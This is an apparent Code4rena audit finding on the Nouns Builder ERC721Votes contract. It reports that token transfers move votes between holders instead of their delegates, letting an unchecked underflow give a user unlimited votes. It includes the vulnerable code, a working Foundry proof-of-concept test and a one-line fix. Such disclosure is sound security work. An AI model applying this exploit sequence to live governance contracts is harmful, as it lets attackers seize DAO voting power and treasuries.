## Tags

- bug
- 3 (High Risk)
- sponsor confirmed
- old-submission-method

# [Use can get unlimited votes](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469) 

# Lines of code

https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268


# Vulnerability details

## Impact

`aftertokenTransfer` in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in `_moveDelegates` and get unlimited votes

## Proof of Concept

https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268

```
    function _afterTokenTransfer(
        address _from,
        address _to,
        uint256 _tokenId
    ) internal override {
        // Transfer 1 vote from the sender to the recipient
        _moveDelegateVotes(_from, _to, 1);

        super._afterTokenTransfer(_from, _to, _tokenId);
    }
```
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216

```
    _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));
    ...
    unchecked {
                ...
                // Update their voting weight
                _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);
            }
```
During delegation `balanceOf(from)` amount of votes transferred are to the `_to` address

```
    function test_UserCanGetUnlimitedVotes() public {

        vm.prank(founder);
        auction.unpause();

        vm.prank(bidder1);
        auction.createBid{ value: 1 ether }(2);

        vm.warp(10 minutes + 1 seconds);

        auction.settleCurrentAndCreateNewAuction();
        
        assertEq(token.ownerOf(2), bidder1);

        console.log(token.getVotes(bidder1)); // 1
        console.log(token.delegates(bidder1)); // 0 bidder1

        vm.prank(bidder1);
        token.delegate(bidder2);

        console.log(token.getVotes(bidder1)); // 1
        console.log(token.getVotes(bidder2)); // 1

        vm.prank(bidder1);
        auction.createBid{value: 1 ether}(3);

        vm.warp(22 minutes);

        auction.settleCurrentAndCreateNewAuction();

        assertEq(token.ownerOf(3), bidder1);

        console.log(token.balanceOf(bidder1)); // 2
        console.log(token.getVotes(bidder1)); // 2
        console.log(token.getVotes(bidder2)); // 1

        vm.prank(bidder1);        
        token.delegate(bidder1);

        console.log(token.getVotes(bidder1)); // 4
        console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895     
  }
```

When user1 delegates to another address `balanceOf(user1)` amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked

## Tools Used

foundry

## Recommended Mitigation Steps

Change delegate transfer in `afterTokenTransfer` to 

```
        _moveDelegateVotes(delegates(_from), delegates(_to), 1);
```

